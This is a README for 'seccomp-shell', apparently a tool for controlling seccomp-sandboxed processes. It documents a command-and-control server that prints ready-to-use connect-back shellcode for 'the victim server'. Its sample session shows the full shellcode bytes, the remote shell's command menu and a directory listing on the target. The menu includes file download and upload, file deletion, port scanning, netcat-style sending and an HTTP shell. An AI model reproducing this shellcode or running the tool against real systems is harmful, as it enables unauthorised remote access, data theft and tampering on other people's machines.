# seccomp-shell

`seccomp-shell` allows you to execute common shell commands in a restricted seccomp environment.

## Installation

```
cargo build --release
```

## Example

- Start the C&C Server
  ```
  > help
  
      Core Commands
      =============
  
          Command       Description
          -------       -----------
          help          Help menu
          server        Establish C&C server
          exit          Exit program
  
  > server
  [!] SYS_socket and SYS_connect should be allowed
  server> help
  
      Core Commands
      ============= 
  
          Command                Description
          -------                -----------
          options                List all options
          set <option> <value>   Set option
          run                    Start server
          close                  Close server
          back                   Back to menu
  server> options
  
      Options
      =======
  
          Option        Value           Description
          ------        -----           -----------
          host          127.0.0.1       Server host
          port          4444            Server port
          format        quoted          Shellcode format
          read_syscall  SYS_read        Read syscall
  
  
      Available Syscalls
      ==================
  
          Verb          Syscalls
          ----          --------
          read_syscall  SYS_read, SYS_recvfrom
  
      Shellcode Formats
      ==================
  
          Format        Example
          -------       -------
          quoted        "\xde\xad\xbe\xef"
          hex           deadbeef
  server> set host 127.0.0.1
  [+] Host set to '127.0.0.1'
  server> set port 31337
  [+] Port set to '31337'
  server> run
  [*] Run the following shellcode on the victim server:
  "\xeb\x10\x31\xc0\x53\x5f\x49\x8d\x77\x10\x48\x31\xd2\x80\xc2\xff\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5b\x48\x97\x68\x7f\x00\x00\x01\x66\x68\x7a\x69\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x4c\x8d\x3d\xc5\xff\xff\xff\x41\xff\xe7"
  [*] Waiting for connection on 127.0.0.1:31337
  ```
- Run the shellcode on victim
- The server should reply `"Connection established from [IP]:[PORT]"`
  ```
  [+] Connection established from 127.0.0.1:41248
  $ help
  
      Core Commands
      =============
  
          Command                    Description                                    Syscalls
          -------                    -------                                        -----------
          help                       Print This Menu                                N/A
          ls [DIR]                   List Directory                                 SYS_open, SYS_getdents
          dir [DIR]                  List Directory                                 SYS_open, SYS_getdents
          cat <FILE>                 Print File Content                             SYS_open, SYS_close
          cd <DIR>                   Change Directory                               SYS_chdir
          pwd                        Print Current Directory                        SYS_getcwd
          download <FILE>            Download File                                  SYS_open, SYS_close
          upload <FILE> [PERM]       Upload File                                    SYS_open, SYS_close
          rm <FILE>                  Remove File                                    SYS_unlink
          mv <SOURCE> <DEST>         Move File                                      SYS_rename
          cp <SOURCE> <DEST> [PERM]  Copy File                                      SYS_open, SYS_close
          mkdir <DIR> [PERM]         Create a Directory                             SYS_mkdir
          rmdir <DIR>                Remove a Directory                             SYS_rmdir
          getuid                     Get Current UID                                SYS_getuid
          getgid                     Get Current GID                                SYS_getgid
          portscan                   Scan Ports on localhost                        SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
          netcat <INPUT_FILE> <Port> Send Data in the Input File to Port            SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
                                     and Receive Output
          http-shell                 HTTP Interactive Shell                         SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
          redis-cli                  Simple Redis Client                            SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
          exit                       Exit shell                                     N/A
          quit                       Exit shell                                     N/A
  
  
  $ cd /
  [+] Directory changed to '/'
  $ ls
  [+] Listing directory '.'
  .
  ..
  boot
  var
  dev
  run
  etc
  tmp
  sys
  proc
  usr
  bin
  home
  lib
  lib64
  mnt
  opt
  root
  sbin
  srv
  $ 
  ```

## TODO

- [ ] Add chown and chmod
- [ ] Add other ports
  - [ ] ftp
  - [ ] ssh
  - [ ] smb
  - [ ] and more
- [ ] Add udp port scan
- [ ] Refactor shellcode

## License

GPLv3
